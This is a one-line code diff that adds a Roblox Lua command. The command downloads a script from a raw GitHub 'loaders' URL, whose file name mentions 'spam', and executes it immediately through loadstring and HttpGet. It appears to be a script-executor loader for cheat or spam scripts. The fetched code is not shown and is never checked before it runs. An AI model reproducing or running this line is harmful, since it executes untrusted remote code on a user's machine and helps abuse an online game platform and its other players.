@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/beta-buddytime-spam4-xe4qgis1goshe1.lua"))()
